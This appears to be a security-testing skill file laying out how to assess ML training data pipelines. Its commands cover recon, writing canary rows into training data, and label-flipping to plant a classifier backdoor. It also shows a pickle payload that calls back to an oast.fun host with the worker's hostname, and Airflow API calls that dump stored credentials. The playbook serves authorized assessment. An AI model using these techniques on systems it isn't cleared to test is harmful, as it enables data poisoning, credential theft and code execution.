---
name: training_data_pipeline
description: Assessing ML training data pipelines for data poisoning, source-trust failures, and pipeline access-control gaps.
---

# Training Data Pipeline

A training data pipeline ingests raw data (scraped web, user uploads, third-party feeds, labeling output), transforms and validates it, then versions it into datasets that feed model training. The attacker's objective is to influence what the model learns (poisoning), exfiltrate the data or the credentials guarding it, or take over the orchestration that schedules training. Because outputs flow downstream into deployed models, a single tainted source or writable storage prefix can become a durable, hard-to-detect backdoor. Assess these systems as a chain: ingestion source -> staging store -> transform/feature jobs -> dataset registry -> training trigger.

## Attack Surface

**Ingestion sources**
- Scrapers/crawlers pulling from attacker-influenceable URLs, RSS, public APIs
- User-contributed data: upload endpoints, form submissions, feedback/RLHF buttons, support tickets
- Third-party feeds and data-broker buckets mounted read-only (or read-write)
- Crowdsourced labeling platforms (Mechanical Turk, Label Studio, Scale callbacks)

**Storage and transport**
- Object stores: S3, GCS, Azure Blob; data-lake prefixes (`s3://.../raw/`, `/staging/`, `/curated/`)
- Table/lakehouse formats: Parquet/Delta/Iceberg, Hive metastore, Unity Catalog
- Message queues / streaming: Kafka, Kinesis, Pub/Sub topics feeding stream ingestion
- DVC/LakeFS/Pachyderm/Quilt dataset versioning; HuggingFace Datasets repos

**Orchestration and compute**
- Airflow, Dagster, Prefect, Kubeflow Pipelines, Argo Workflows, Flyte web UIs/APIs
- Spark/Ray/Dask clusters, EMR/Dataproc/Databricks jobs
- Feature stores: Feast, Tecton, SageMaker Feature Store

**Artifacts and config**
- Pipeline DAG repos (Python), notebooks, `requirements.txt`/conda envs (dependency confusion)
- Pickled preprocessors, `joblib`/`pickle`/`dill` artifacts, custom dataset loader code

## Recon & Enumeration

Map exposed services and web UIs first:
```
subfinder -d target.tld -all -silent | dnsx -silent -a -resp | tee hosts.txt
naabu -list hosts.txt -p 8080,8793,8888,5000,8265,7077,4040,9870,9000,5432,9092,8088 -silent
httpx -l hosts.txt -title -tech-detect -status-code -mc 200,401,403 -o web.txt
```
Fingerprint orchestrators and data UIs (default ports: Airflow 8080/8793, Dagster 3000, Prefect 4200, Kubeflow/Argo via ingress, Ray dashboard 8265, Spark 4040/8080, MLflow 5000, MinIO 9000/9001):
```
nuclei -l web.txt -tags airflow,argo,kubeflow,mlflow,spark,jupyter,exposure,misconfig -s critical,high,medium -j -o mlpipe.jsonl
ffuf -u https://HOST/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,401,403 -fs 0
katana -u https://HOST -jc -d 3 -o endpoints.txt
```
Hunt cloud storage and IAM exposure (install if absent: `pip install awscli`, `pipx install prowler scoutsuite`):
```
aws s3 ls s3://target-ml-data/ --no-sign-request
aws s3api get-bucket-acl --bucket target-ml-data
aws s3api get-bucket-policy --bucket target-ml-data
prowler aws -s s3 -s iam -s glue --output-formats json-ocsf
scout aws --report-dir scout_out
```
Scan repos/artifacts for leaked credentials and unsafe loaders:
```
trufflehog filesystem ./pipeline-repo --results=verified --json
gitleaks detect -s ./pipeline-repo -f json -r gitleaks.json
semgrep --config p/python --config p/secrets ./pipeline-repo
semgrep -e 'pickle.load(...)' -e 'pandas.read_pickle(...)' -e 'joblib.load(...)' --lang python ./pipeline-repo
```
Inspect dependency supply chain and container images:
```
syft dir:./pipeline-repo -o table
grype dir:./pipeline-repo --only-fixed
trivy image registry/ingest-worker:latest --scanners vuln,secret,misconfig
```

## Methodology

1. **Map the data flow.** Identify every source -> store -> job -> dataset -> training-trigger hop. For each hop, record who can write and who reads downstream. The poisoning blast radius is "anything an attacker can write that a transform consumes without validation."
2. **Enumerate ingestion trust.** For each source, determine whether the content is attacker-influenceable (open upload, scraped attacker-controlled domain, public feed) and whether provenance is recorded (hash, signature, source allowlist).
3. **Test storage ACLs.** Enumerate object-store prefixes and check write access to `raw/`/`staging/`/`incoming/` even if `curated/` is locked. Writable upstream + automatic downstream promotion = poisoning.
4. **Probe orchestration access control.** Hit Airflow/Argo/Kubeflow/MLflow APIs unauthenticated and with low-priv tokens; check for DAG-trigger, variable/connection read, and code-upload permissions.
5. **Assess transform code safety.** Look for `pickle`/`joblib`/`yaml.load`/`pandas.read_pickle` on untrusted artifacts, `eval`/`exec` on row content, and dynamic loader imports — these turn poisoned data into RCE on the training worker.
6. **Check dataset versioning integrity.** Determine whether dataset commits are signed/hashed and whether a stale or attacker-pushed version can be referenced by a training job.
7. **Trace to training.** Confirm whether a poisoned/modified dataset is actually picked up by a scheduled or triggered training run (the difference between theoretical and proven impact).
8. **Validate with a benign marker** and document the full path from injection point to consumed dataset.

## Key Weaknesses / Techniques

**Data poisoning via writable upstream**
- Writable `raw/`/`incoming/` prefix with auto-promotion. Drop a benign canary row and confirm it appears in the curated/versioned dataset:
```
echo '{"id":"poison-canary-7f3a","label":"benign-marker","text":"unique-token-9912"}' > c.jsonl
aws s3 cp c.jsonl s3://target-ml-data/raw/feed/$(date +%s).jsonl
# later: grep the curated output / dataset version for unique-token-9912
```
- Label flipping / targeted poisoning: if you control labels in a labeling callback, submit consistent mislabels for a trigger phrase to assess backdoor feasibility (keep volume tiny, marker-tagged).

**Source-trust failures**
- Scraper follows attacker-controlled domain or redirect with no allowlist — host content that becomes training text. Confirm ingestion of a unique token served from your domain.
- No provenance/hash check: modified third-party feed accepted silently. Verify by altering a benign field and observing no validation rejection.

**Unsafe deserialization (poison -> RCE)**
- Dataset loaders that `pickle.load`/`joblib.load`/`torch.load` artifacts from a writable store. A malicious pickle runs code in the training job. Validate non-destructively with an OOB callback rather than a shell:
```
interactsh-client -v        # note the *.oast.fun domain
# craft a pickle whose __reduce__ runs: curl http://UNIQUE.oast.fun/$(hostname)
# upload to the loader's input prefix, trigger the job, watch interactsh for the hit
```

**Pipeline access-control gaps**
- Airflow REST API exposed without auth or with default creds:
```
curl -s https://HOST/api/v1/dags | jq '.dags[].dag_id'
curl -s -X POST https://HOST/api/v1/dags/DAG_ID/dagRuns -H 'Content-Type: application/json' -d '{"conf":{}}'
curl -s https://HOST/api/v1/connections | jq      # leaks DB/cloud creds
curl -s https://HOST/api/v1/variables | jq
```
- Argo Workflows / Kubeflow Pipelines submit endpoints reachable -> arbitrary container execution in-cluster.
- MLflow tracking server open: read/overwrite run params and registered-model artifacts (`mlflow.get_artifact_uri` pointing at writable store -> artifact swap).

**Injection in transform layer**
- SQL/Spark-SQL built from row values: `sqlmap -u "https://HOST/feature?key=*" --batch --risk=2` on feature lookup APIs.
- Path traversal in upload/ingest filenames: `../../staging/curated/train.parquet` overwrite. Test with `ffuf` traversal wordlists against the upload path.

**Secret exposure**
- Connection strings, cloud keys, and HF/Weights&Biases tokens in DAG code, Airflow Variables, notebooks, or env. trufflehog/gitleaks + the Airflow `variables`/`connections` endpoints above.

## Validation

1. **Poisoning:** show a uniquely tagged benign record injected at an attacker-writable point propagates into the curated/versioned dataset consumed by training (grep the dataset version or feature table for the marker). Do not inject volume or malicious labels beyond a tagged proof sample.
2. **Source trust:** demonstrate content served from a tester-controlled origin is ingested verbatim (unique token traceable end to end).
3. **RCE via loader:** confirm via a single OOB DNS/HTTP callback from the training worker (interactsh), capturing hostname — never deploy a persistent shell or destructive payload.
4. **Access control:** capture an authenticated-action response from an unauthenticated/low-priv request (e.g., a successful DAG-trigger `dag_run_id`, or a `connections` dump). Redact secret values in the report.
5. Record the exact write location, trigger mechanism, and downstream consumer so the finding is reproducible and scoped.

## False Positives

- Writable prefix that feeds a quarantine/manual-review queue and never auto-promotes — no path to training.
- Object store readable only with the tester's own credentials (your role, not anonymous/cross-account) — that is your access, not a misconfig.
- Orchestrator UI returning 200 on a login page only; confirm an actual privileged API action succeeds.
- "Poisoned" canary that appears in raw staging but is dropped by a validator before the curated set — note the validator, not a finding.
- Pickle/joblib loads scoped strictly to first-party, integrity-checked artifacts in a non-writable store.
- interactsh callbacks sourced from the tester's own IP (client-side) rather than the worker.

## Chaining & Impact

- Writable raw store -> auto-promotion -> poisoned dataset -> backdoored/biased deployed model (durable, survives retrains until source is purged).
- Unsafe loader + writable input -> RCE on training worker -> cloud role of the worker -> IMDS/credential theft -> data-lake-wide read/write -> mass poisoning or exfiltration.
- Open Airflow/Argo -> leaked `connections` (DB, S3, Snowflake) -> direct dataset and warehouse access -> exfiltration or tampering.
- Compromised labeling callback -> targeted label flips on a trigger phrase -> classifier backdoor activating on attacker input in production.
- Dependency confusion in pipeline `requirements.txt` -> malicious package -> code execution across every pipeline run.

## Pro Tips

1. Follow writability upstream, not just at `curated/`. The cheapest poisoning is a forgotten world-writable `incoming/` prefix with a cron promoter.
2. Always tag PoC data with a unique, greppable token and keep volume to a single record — you prove the path without affecting model behavior.
3. Airflow `connections`/`variables` endpoints are the fastest path from "exposed UI" to "cloud credentials"; check them before anything heavier.
4. Treat every `pickle.load`/`torch.load`/`joblib.load` on a writable artifact as latent RCE; validate with one OOB callback, never a shell.
5. Check whether dataset versions are content-addressed (hash) or mutable tags — mutable `latest`-style refs let you swap data a job already "approved."
6. Streaming ingestion (Kafka/Kinesis) often has weaker auth than the REST APIs; an open producer ACL is a direct poisoning channel.
7. Distinguish ingested-but-quarantined from ingested-and-trained; only the latter is real impact — trace to an actual training trigger before reporting.
8. Scan notebooks (`.ipynb`) separately — semgrep/trufflehog defaults sometimes skip them, and they are full of hardcoded tokens and ad-hoc loaders.
